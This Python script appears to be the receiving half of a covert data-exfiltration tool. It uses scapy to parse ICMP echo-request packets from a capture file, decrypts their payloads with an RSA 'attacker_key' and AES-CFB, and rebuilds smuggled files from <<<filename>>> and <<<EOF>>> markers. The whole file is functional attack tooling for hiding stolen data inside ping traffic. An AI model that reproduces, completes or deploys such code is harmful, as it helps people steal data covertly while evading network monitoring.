from scapy.all import *
import argparse
import re
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES

# This matches the pattern of <<whatever.exe>> inside the brackets
startpattern = re.compile(r"<<<(.*?)>>>", re.IGNORECASE)
endpattern = re.compile(r"<<<EOF>>>", re.IGNORECASE)
filename = ""


# AES function to decrypt AES key with RSA 1024 encryption private key
def decryptAES(content):
    attacker_key = RSA.importKey(open("private.pem").read())

    # Decrypt the last 128 bytes
    cipher_rsa = PKCS1_OAEP.new(attacker_key)
    decrypt_AES = ""
    try:
        decrypt_AES = cipher_rsa.decrypt(content)
    except ValueError as ve:
        print(f"Wrong")
    return decrypt_AES

#Only sniff the echo request packets and not other types
def startICMPSniffer(filepath):
    print("Starting ICMP sniffer....")
    sniff(filter="icmp [icmptype] == 8", offline=filepath, prn=receiveData)

# Function to receive data
def receiveData(packet):

    # Referring to the global variable. For each File
    global filename

    if packet.haslayer(ICMP) and packet.haslayer(Raw):
        # Loads the entire Data packet bytes into raw
        raw = packet.getlayer(Raw).load
        # Extracts the IV, from the end to start of AES key
        iv = raw[-144:-128]

        # Decrypts the AES key from our RSA private key
        AESkey = decryptAES(raw[-128:])

        # Creating the AES keychain for decrypting our file
        try:
            aes = AES.new(AESkey, AES.MODE_CFB, iv)
        except ValueError as ve:
            print(f"Wrong")
            return

        # Decrypts the data portion of the ICMP data field
        decrypted = aes.decrypt(raw[:-144])
        decoded = decrypted.decode('latin-1')
        
        # Checks for file pattern. in the first 100 bytes
        matched = startpattern.search(decoded[:100])

        # Last 5 bytes or so if its last packet will be <<EOF>>
        endmatched = endpattern.search(decoded[-20:])

        #Matched EOF
        if endmatched is not None:
            print("EOF")
            f = open(filename,"ab")
            # We -9 Because dont take the <<<EOF>>> but write the rest
            f.write(decrypted[8:-9])
            f.close()
            filename="" #reinitialise the variable
        
        #Matched a new file
        elif matched is not None:
            print("New File")
            filename = matched.group().strip("<>")  # Takes up 6 bytes
            f = open(filename, "ab")
            filenamelength = len(filename)
            f.write(decrypted[8+filenamelength+6:]) #+6 because of the <<< >
            f.close()

        #Continuation of writing of file
        else:
            f = open(filename, "ab")
            f.write(decrypted[8:])
            f.close()


parse = argparse.ArgumentParser()
parse.add_argument("-p", "--path", help = "Filepath to wireshark capture", required=True)
args = parse.parse_args()

#Checks the argument if file path exists. And if yes, starts the ICMP sniffer
if __name__ == "__main__":
    try:
        path = args.path
        if not os.path.exists(path):
            raise ValueError("Invalid File path!")
        startICMPSniffer(path)
    except ValueError as e:
        print(e)

